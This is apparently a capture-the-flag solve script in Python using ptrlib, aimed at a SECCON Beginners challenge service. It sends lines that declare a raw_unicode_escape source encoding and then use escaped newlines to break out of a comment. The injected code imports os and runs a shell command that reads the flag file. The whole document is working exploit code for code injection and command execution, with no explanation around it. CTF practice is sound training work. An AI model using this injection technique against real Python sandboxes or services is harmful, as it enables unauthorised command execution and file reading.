from ptrlib import *

logger.setLevel(0)

sock = Socket("nc commentator.beginners.seccon.games 4444")

sock.sendlineafter(">>> ", "coding: raw_unicode_escape")
sock.sendlineafter(">>> ", "\\u000aimport os")
sock.sendlineafter(">>> ", '\\u000aos.system("cat /flag-*.txt")')
sock.sendlineafter(">>> ", "__EOF__")

print(sock.recvuntil("thx :)", drop=True).decode())
